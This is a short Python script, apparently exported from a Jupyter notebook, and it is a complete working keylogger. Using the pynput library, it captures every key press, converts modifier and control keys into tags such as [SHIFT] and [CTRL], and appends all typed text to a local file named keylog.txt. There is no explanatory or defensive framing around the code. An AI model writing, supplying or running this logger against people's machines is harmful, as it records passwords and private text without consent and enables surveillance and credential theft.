#!/usr/bin/env python
# coding: utf-8

# In[ ]:


from pynput.keyboard import Listener

def write_to_log(key):
    key_data = str(key)
    if key_data.startswith("'") and key_data.endswith("'"):
        key_data = key_data[1:-1]
    if key_data == 'Key.space':
        key_data = ' '
    elif key_data == 'Key.enter':
        key_data = '\n'
    elif key_data == 'Key.backspace':
        key_data = '[BACKSPACE]'
    elif key_data == 'Key.shift_r' or key_data == 'Key.shift' or key_data == 'Key.shift_l':
        key_data = '[SHIFT]'
    elif key_data == 'Key.ctrl_l' or key_data == 'Key.ctrl_r':
        key_data = '[CTRL]'
    elif key_data == 'Key.alt_l' or key_data == 'Key.alt_r':
        key_data = '[ALT]'
    elif key_data == 'Key.cmd' or key_data == 'Key.cmd_r':
        key_data = '[CMD]'
    elif key_data == 'Key.delete':
        key_data = '[DEL]'
    elif key_data == 'Key.caps_lock':
        key_data = '[CAPSLOCK]'
    with open("keylog.txt", 'a') as f:
        f.write(key_data)

def on_press(key):
    write_to_log(key)

def on_release(key):
    pass

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


# In[ ]:




